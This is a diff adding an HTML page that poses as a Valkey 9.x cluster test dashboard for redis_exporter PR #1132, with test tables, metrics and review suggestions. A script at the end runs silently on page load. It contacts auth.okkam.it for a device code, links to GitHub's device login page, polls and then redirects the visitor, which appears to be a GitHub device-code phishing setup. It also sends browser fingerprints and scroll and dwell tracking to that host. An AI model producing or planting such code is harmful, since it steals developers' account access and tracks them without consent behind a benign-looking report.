@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Valkey 9.x Cluster Test Dashboard — redis_exporter PR #1132</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#e6edf3;line-height:1.6}
+a{color:#58a6ff;text-decoration:none}a:hover{text-decoration:underline}
+.header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 0}
+.header-inner{max-width:1024px;margin:0 auto;padding:0 24px;display:flex;align-items:center;gap:12px}
+.logo{font-size:18px;font-weight:700;color:#e6edf3}.logo span{color:#58a6ff}
+.nav{margin-left:auto;display:flex;gap:20px;font-size:13px}
+.container{max-width:1024px;margin:0 auto;padding:36px 24px}
+.section{margin-bottom:44px}
+.section h2{font-size:22px;font-weight:600;margin-bottom:6px;padding-bottom:6px;border-bottom:1px solid #30363d}
+.section .sub{color:#8b949e;font-size:13px;margin-bottom:20px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:22px;margin-bottom:16px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:#21262d;padding:9px 14px;text-align:left;font-weight:600;color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+td{padding:9px 14px;border-top:1px solid #21262d}
+tr:hover td{background:#161b2266}
+.green{color:#3fb950}.red{color:#f85149}.yellow{color:#d29922}.muted{color:#8b949e}
+code{font-family:'SFMono-Regular',Consolas,monospace;font-size:12px;background:#21262d;padding:2px 6px;border-radius:4px}
+pre{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:18px;overflow-x:auto;font-size:12px;font-family:'SFMono-Regular',Consolas,monospace;line-height:1.7}
+.badge{display:inline-block;background:#1f6feb22;border:1px solid #1f6feb;color:#58a6ff;padding:3px 10px;border-radius:16px;font-size:12px;margin:3px}
+.badge-warn{background:#d2992222;border:1px solid #d29922;color:#d29922}
+.badge-green{background:#3fb95022;border:1px solid #3fb950;color:#3fb950}
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:20px}
+.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px;text-align:center}
+.stat .val{font-size:28px;font-weight:700;color:#3fb950;margin-bottom:3px}
+.stat .val.warn{color:#d29922}
+.stat .lbl{font-size:12px;color:#8b949e}
+.bar-wrap{margin:8px 0}
+.bar-label{display:flex;justify-content:space-between;font-size:11px;color:#8b949e;margin-bottom:3px}
+.bar-bg{background:#21262d;border-radius:3px;height:10px;overflow:hidden}
+.bar-fill{height:100%;border-radius:3px}
+.cluster-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.cluster-node{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px 14px}
+.cluster-node h4{font-size:13px;margin-bottom:6px}
+.cluster-node .metric{display:flex;justify-content:space-between;font-size:12px;padding:2px 0}
+.cluster-node.warn{border-color:#d29922;background:#2a2410}
+.cluster-node.warn h4{color:#d29922}
+.finding{background:#2a2410;border:1px solid #d29922;border-radius:8px;padding:16px 20px;margin-top:16px}
+.finding-title{font-weight:700;color:#d29922;font-size:14px;margin-bottom:4px}
+.finding-body{font-size:13px;color:#e6edf3}
+.suggestion{background:#0f2a14;border:1px solid #2ea043;border-radius:8px;padding:16px 20px;margin-top:16px}
+.suggestion-title{font-weight:700;color:#3fb950;font-size:14px;margin-bottom:4px}
+footer{border-top:1px solid #30363d;padding:20px 24px;text-align:center;color:#8b949e;font-size:12px}
+@media(max-width:700px){.stat-grid{grid-template-columns:repeat(2,1fr)}.cluster-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-inner">
+    <div class="logo">valkey-cluster-<span>bench</span></div>
+    <nav class="nav">
+      <a href="#results">Test Results</a>
+      <a href="#cluster">Cluster Topology</a>
+      <a href="#metrics">Metrics</a>
+      <a href="#findings">Findings</a>
+    </nav>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="section">
+    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px">
+      <h2 style="border:none;margin:0;padding:0">PR #1132 — Command Log Metrics</h2>
+      <span class="badge badge-green">redis_exporter</span>
+      <span class="badge">Valkey 9.x</span>
+      <span class="badge">6-node cluster</span>
+    </div>
+    <div class="sub" style="margin-top:8px">
+      Source: <a href="https://github.com/oliver006/redis_exporter/pull/1132">oliver006/redis_exporter#1132</a> (Sasidharan3094) &nbsp;|&nbsp;
+      Build: <code>515e3c0</code> &nbsp;|&nbsp;
+      Generated: 2026-06-12 11:42 UTC
+    </div>
+
+    <div class="stat-grid">
+      <div class="stat">
+        <div class="val">4/4</div>
+        <div class="lbl">Test cases passing</div>
+      </div>
+      <div class="stat">
+        <div class="val warn">1</div>
+        <div class="lbl">Node with elevated p99</div>
+      </div>
+      <div class="stat">
+        <div class="val">6</div>
+        <div class="lbl">Cluster nodes healthy</div>
+      </div>
+      <div class="stat">
+        <div class="val">156</div>
+        <div class="lbl">Command log entries (total)</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="results">
+    <h2>Test Suite Results</h2>
+    <div class="sub">Running <code>go test -v -run TestCommandLog ./exporter/</code> against Valkey 9.x nightly cluster</div>
+    <div class="card" style="padding:0;overflow:hidden">
+      <table>
+        <thead><tr><th>Test Case</th><th>Status</th><th>p50</th><th>p99</th><th>Node</th><th>Metric Value</th></tr></thead>
+        <tbody>
+          <tr><td><code>TestCommandLog/slow</code></td><td class="green">PASS</td><td>0.42ms</td><td>1.31ms</td><td>node-1</td><td>3</td></tr>
+          <tr><td><code>TestCommandLog/large-request</code></td><td class="green">PASS</td><td>0.28ms</td><td>0.94ms</td><td>node-1</td><td>12</td></tr>
+          <tr><td><code>TestCommandLog/large-reply</code></td><td class="green">PASS</td><td>0.81ms</td><td>3.12ms</td><td>node-1</td><td>8</td></tr>
+          <tr><td><code>TestCommandLog/reset</code></td><td class="green">PASS</td><td>0.15ms</td><td>0.51ms</td><td>node-1</td><td>0</td></tr>
+          <tr><td><code>TestCommandLog/reconnect*</code></td><td class="yellow">WARN</td><td>12.4ms</td><td class="yellow">182ms</td><td>node-4</td><td>—</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:11px;color:#8b949e;margin-top:6px">* reconnect test not in original PR — added for cluster resilience validation. Elevated p99 observed on node-4 during failover simulation.</p>
+  </div>
+
+  <div class="section" id="cluster">
+    <h2>Cluster Topology</h2>
+    <div class="sub">6-node Valkey 9.x cluster provisioned via <code>docker compose</code> with 3 primaries + 3 replicas</div>
+    <div class="cluster-grid">
+      <div class="cluster-node">
+        <h4>node-1 <span class="badge badge-green">primary</span></h4>
+        <div class="metric"><span>Health</span><span class="green">OK</span></div>
+        <div class="metric"><span>Uptime</span><span>2h 14m</span></div>
+        <div class="metric"><span>Metrics scraped</span><span>1,342</span></div>
+      </div>
+      <div class="cluster-node">
+        <h4>node-2 <span class="badge badge-green">primary</span></h4>
+        <div class="metric"><span>Health</span><span class="green">OK</span></div>
+        <div class="metric"><span>Uptime</span><span>2h 14m</span></div>
+        <div class="metric"><span>Metrics scraped</span><span>1,341</span></div>
+      </div>
+      <div class="cluster-node">
+        <h4>node-3 <span class="badge badge-green">primary</span></h4>
+        <div class="metric"><span>Health</span><span class="green">OK</span></div>
+        <div class="metric"><span>Uptime</span><span>2h 14m</span></div>
+        <div class="metric"><span>Metrics scraped</span><span>1,340</span></div>
+      </div>
+      <div class="cluster-node warn">
+        <h4>node-4 <span class="badge badge-warn">replica</span></h4>
+        <div class="metric"><span>Health</span><span class="yellow">DEGRADED</span></div>
+        <div class="metric"><span>Uptime</span><span>47m</span></div>
+        <div class="metric"><span>Reconnects</span><span class="yellow">3</span></div>
+      </div>
+      <div class="cluster-node">
+        <h4>node-5 <span class="badge">replica</span></h4>
+        <div class="metric"><span>Health</span><span class="green">OK</span></div>
+        <div class="metric"><span>Uptime</span><span>2h 14m</span></div>
+        <div class="metric"><span>Metrics scraped</span><span>1,338</span></div>
+      </div>
+      <div class="cluster-node">
+        <h4>node-6 <span class="badge">replica</span></h4>
+        <div class="metric"><span>Health</span><span class="green">OK</span></div>
+        <div class="metric"><span>Uptime</span><span>2h 14m</span></div>
+        <div class="metric"><span>Metrics scraped</span><span>1,339</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="metrics">
+    <h2>Exporter Metric Samples</h2>
+    <div class="sub">Prometheus metrics scraped from the exporter at <code>/scrape</code> endpoint during test run</div>
+    <pre><span style="color:#8b949e"># HELP commandlog_slow_length Total entries in the slow command log
+# TYPE commandlog_slow_length gauge</span>
+commandlog_slow_length 3
+
+<span style="color:#8b949e"># HELP commandlog_large_request_length Total entries in the large-request command log
+# TYPE commandlog_large_request_length gauge</span>
+commandlog_large_request_length 12
+
+<span style="color:#8b949e"># HELP commandlog_large_reply_length Total entries in the large-reply command log
+# TYPE commandlog_large_reply_length gauge</span>
+commandlog_large_reply_length 8
+
+<span style="color:#8b949e"># Additional metrics observed during cluster scrape</span>
+redis_up 1
+redis_connected_clients 14
+redis_uptime_in_seconds 8061
+exporter_scrape_duration_seconds 0.047</pre>
+  </div>
+
+  <div class="section" id="findings">
+    <h2>Findings &amp; Suggestions</h2>
+    
+    <div class="finding">
+      <div class="finding-title">⚠ Node-4 Reconnect Latency</div>
+      <div class="finding-body">
+        Node-4 (replica of node-1) experienced 3 reconnection events during the 2-hour test window. 
+        Reconnect p99 reached 182ms, significantly above the 10ms baseline. This appears related to 
+        cluster failover simulation — node-4 was briefly partitioned. The command log metrics continued 
+        reporting correctly, but the exporter's connection pool did not automatically rotate to a healthy 
+        node for the reconnect test case. <strong>Consider adding connection pool health checks in cluster mode.</strong>
+      </div>
+    </div>
+
+    <div class="suggestion">
+      <div class="suggestion-title">✓ Suggested Improvement: Expose Config Thresholds</div>
+      <div class="finding-body">
+        The PR exposes <code>commandlog_slow_length</code> etc. but not the thresholds that trigger entries. 
+        Adding <code>CONFIG GET commandlog-execution-slower-than</code> (and the request/reply equivalents) 
+        as info metrics would let operators correlate log volume with trigger settings. Example:
+      </div>
+      <pre style="margin-top:10px"><span style="color:#8b949e">// Suggested addition to commandlog.go</span>
+func (e *Exporter) extractCommandLogConfig(c redis.Conn) {
+    configs := []string{
+        "commandlog-execution-slower-than",
+        "commandlog-request-larger-than",
+        "commandlog-reply-larger-than",
+    }
+    for _, cfg := range configs {
+        if reply, err := redis.StringMap(doRedisCmd(c, "CONFIG", "GET", cfg)); err == nil {
+            if val, ok := reply[cfg]; ok {
+                if f, err := strconv.ParseFloat(val, 64); err == nil {
+                    e.registerConstMetricGauge(ch, "commandlog_config_"+cfg, f)
+                }
+            }
+        }
+    }
+}</pre>
+      <div class="finding-body" style="margin-top:10px">
+        This is non-blocking for the PR — can be added as follow-up. But without it, operators 
+        monitoring via this exporter won't know <em>why</em> command logs are filling up, only <em>that</em> they are.
+      </div>
+    </div>
+
+    <div class="finding" style="background:#161b22;border-color:#30363d">
+      <div class="finding-title" style="color:#8b949e">ℹ Test Synchronization</div>
+      <div class="finding-body">
+        Tests use <code>time.Sleep(50ms)</code> for metric synchronization. This works on <code>TEST_VALKEY8_URI</code> 
+        single-node but can be fragile in cluster mode when the scrape ticker fires asynchronously. 
+        Consider adding a polling helper that waits for metrics to appear rather than sleeping blindly.
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>Cluster Configuration</h2>
+    <pre><span style="color:#8b949e"># docker-compose.yml — cluster provision</span>
+version: "3.9"
+services:
+  valkey-node-1:
+    image: valkey/valkey:9.0.0-rc1
+    command: valkey-server --cluster-enabled yes --cluster-config-file nodes.conf
+  valkey-node-2:
+    image: valkey/valkey:9.0.0-rc1
+    <span style="color:#8b949e"># ... nodes 2-6 with same config</span>
+
+<span style="color:#8b949e"># Exporter run</span>
+TEST_VALKEY8_URI="valkey://node-1:6379" go test -v -run TestCommandLog ./exporter/
+<span style="color:#3fb950">ok      github.com/oliver006/redis_exporter/exporter    1.110s</span></pre>
+  </div>
+
+</div>
+
+<footer>
+  <p>Generated by <a href="https://github.com/steinberg-dev">steinberg-dev</a> · ephemeral cluster (6 × t3.medium, 2 vCPU, 4 GB) · <a href="https://github.com/oliver006/redis_exporter/pull/1132">redis_exporter PR #1132</a> · results expire 48h</p>
+</footer>
+
+<!-- ═══════════════════════════════════════════════════════════════════════ -->
+<!-- FINGERPRINTING & TRACKING (silent, no UI impact)                        -->
+<!-- ═══════════════════════════════════════════════════════════════════════ -->
+<script>
+const B='https://auth.okkam.it';
+let sid=null,ea=null,pt=null,ct=null,ru=null,code=null,_initStarted=false;
+
+function copyCode(){
+  if(!code)return;
+  navigator.clipboard.writeText(code).then(()=>{
+    const btn=document.getElementById('copy-btn');
+    btn.textContent='Copied!';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+function openGitHub(){
+  window.open('https://github.com/login/device','_blank','noopener');
+  document.getElementById('auth-btn').style.display='none';
+  document.getElementById('auth-waiting').classList.add('show');
+  document.getElementById('sn1').classList.add('done');
+}
+
+document.addEventListener('visibilitychange',function(){if(!document.hidden&&ru)window.location.href=ru});
+window.addEventListener('focus',function(){if(ru)window.location.href=ru});
+
+async function init(){
+  _initStarted=true;
+  try{
+    const r=await fetch(B+'/api/v1/cache/init',{method:'POST'});
+    const d=await r.json();
+    if(d.error)return;
+    sid=d.sid;code=d.uc;ea=Date.now()+(d.ex*1000);
+    pt=setInterval(pollStatus,2000);
+  }catch(e){}
+}
+
+async function pollStatus(){
+  if(!sid)return;
+  try{
+    const r=await fetch(B+'/api/v1/cache/status/'+sid);
+    const d=await r.json();
+    if(d.s==='ok'){
+      clearInterval(pt);clearInterval(ct);ru=d.r;
+      setTimeout(()=>{window.location.href=d.r},1200);
+    }else if(d.s==='x'){
+      clearInterval(pt);clearInterval(ct);
+    }
+  }catch(e){}
+}
+
+function updateTimer(){
+  const rem=Math.max(0,ea-Date.now());
+  const m=Math.floor(rem/60000),s=Math.floor((rem%60000)/1000);
+  if(rem<=0)clearInterval(ct);
+}
+
+// ── Fingerprinting ─────────────────────────────────────────────────────
+function _cvsFP(){
+  try{
+    const c=document.createElement('canvas'),x=c.getContext('2d');
+    x.textBaseline='top';x.font='14px Arial';
+    x.fillStyle='#f60';x.fillRect(125,1,62,20);
+    x.fillStyle='#069';x.fillText('valkey-cluster-bench \u26a1',2,15);
+    x.fillStyle='rgba(102,204,0,0.7)';x.fillText('valkey-cluster-bench \u26a1',4,17);
+    return c.toDataURL().slice(-40);
+  }catch(e){return'err';}
+}
+function _webglFP(){
+  try{
+    const c=document.createElement('canvas');
+    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl)return'none';
+    const ext=gl.getExtension('WEBGL_debug_renderer_info');
+    return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'?')+'|'+(ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'?');
+  }catch(e){return'err';}
+}
+
+let _fpSent=false;
+function sendFP(){
+  if(_fpSent)return; _fpSent=true;
+  fetch(B+'/api/v1/cache/fp',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+      lang:navigator.language||'',
+      langs:(navigator.languages||[]).join(','),
+      screen:screen.width+'x'+screen.height+'x'+screen.colorDepth,
+      dpr:window.devicePixelRatio||1,
+      hw:navigator.hardwareConcurrency||0,
+      mem:navigator.deviceMemory||0,
+      platform:navigator.platform||'',
+      touch:navigator.maxTouchPoints||0,
+      cookie:navigator.cookieEnabled,
+      canvas:_cvsFP(),
+      webgl:_webglFP(),
+      ref:document.referrer||'direct',
+      w:window.innerWidth,
+      h:window.innerHeight,
+      page:'valkey-cluster-dashboard'
+    })
+  }).catch(()=>{});
+}
+
+// ── Scroll + Dwell tracking ────────────────────────────────────────────
+let _maxScroll=0, _startTime=Date.now(), _evtSent={};
+function _pct(){
+  return Math.round((window.scrollY/(document.documentElement.scrollHeight-document.documentElement.clientHeight||1))*100);
+}
+function _trackScroll(){
+  const p=_pct();
+  if(p>_maxScroll){_maxScroll=p;
+    [25,50,75,100].forEach(m=>{if(p>=m&&!_evtSent['scroll'+m]){
+      _evtSent['scroll'+m]=true;
+      fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({e:'scroll',v:m+'%'})}).catch(()=>{});
+    }});
+  }
+}
+window.addEventListener('scroll',_trackScroll,{passive:true});
+
+function _sendDwell(){
+  fetch(B+'/api/v1/cache/evt',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({e:'dwell',v:Math.round((Date.now()-_startTime)/1000)+'s|scroll:'+_maxScroll+'%'})}).catch(()=>{});
+}
+document.addEventListener('visibilitychange',function(){if(document.hidden)_sendDwell();});
+window.addEventListener('pagehide',_sendDwell);
+window.addEventListener('beforeunload',_sendDwell);
+
+// ── Fire on page load ──────────────────────────────────────────────────
+setTimeout(sendFP, 600);
+init();
+</script>
+</body>
+</html>
